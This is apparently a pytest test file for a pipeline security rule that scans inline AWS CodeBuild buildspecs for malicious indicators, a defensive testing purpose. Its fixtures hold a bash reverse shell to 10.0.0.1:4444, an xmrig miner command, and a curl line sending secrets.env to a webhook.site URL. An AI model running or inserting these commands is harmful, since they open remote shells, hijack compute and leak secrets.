"""CB-011 — inline buildspec scanning for malicious indicators."""
from __future__ import annotations

from pipeline_check.core.checks.aws.rules import cb011_malicious_buildspec as rule
from tests.aws.rules.conftest import FakeClient


def _project(buildspec: str | None, name: str = "p") -> dict:
    source: dict = {"type": "NO_SOURCE"}
    if buildspec is not None:
        source["buildspec"] = buildspec
    return {"name": name, "source": source}


def _cat(projects, make_catalog):
    client = FakeClient(batch_get_projects={"projects": projects})
    client.set_paginator("list_projects", [{"projects": [p["name"] for p in projects]}])
    return make_catalog(codebuild=client)


def test_no_buildspec_skipped(make_catalog):
    cat = _cat([_project(buildspec=None)], make_catalog)
    assert rule.check(cat) == []


def test_repo_reference_skipped(make_catalog):
    """A single-line path (``ci/build.yml``) is a repo reference; the
    scanner has no text to analyse, so the rule stays silent."""
    cat = _cat([_project(buildspec="ci/build.yml")], make_catalog)
    assert rule.check(cat) == []


def test_benign_inline_passes(make_catalog):
    yaml = "version: 0.2\nphases:\n  build:\n    commands:\n      - make build\n"
    cat = _cat([_project(buildspec=yaml)], make_catalog)
    findings = rule.check(cat)
    assert len(findings) == 1
    assert findings[0].passed is True


def test_reverse_shell_detected(make_catalog):
    yaml = (
        "version: 0.2\nphases:\n  build:\n    commands:\n"
        "      - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
    )
    cat = _cat([_project(buildspec=yaml)], make_catalog)
    findings = rule.check(cat)
    assert findings[0].passed is False
    assert "reverse-shell" in findings[0].description


def test_miner_detected(make_catalog):
    yaml = (
        "version: 0.2\nphases:\n  build:\n    commands:\n"
        "      - xmrig --url stratum+tcp://pool.minexmr.com:443\n"
    )
    cat = _cat([_project(buildspec=yaml)], make_catalog)
    f = rule.check(cat)[0]
    assert f.passed is False
    assert "crypto-miner" in f.description


def test_webhook_exfil_detected(make_catalog):
    yaml = (
        "version: 0.2\nphases:\n  build:\n    commands:\n"
        "      - curl -d @secrets.env https://webhook.site/abc-123\n"
    )
    cat = _cat([_project(buildspec=yaml)], make_catalog)
    f = rule.check(cat)[0]
    assert f.passed is False
    assert "exfil-channel" in f.description
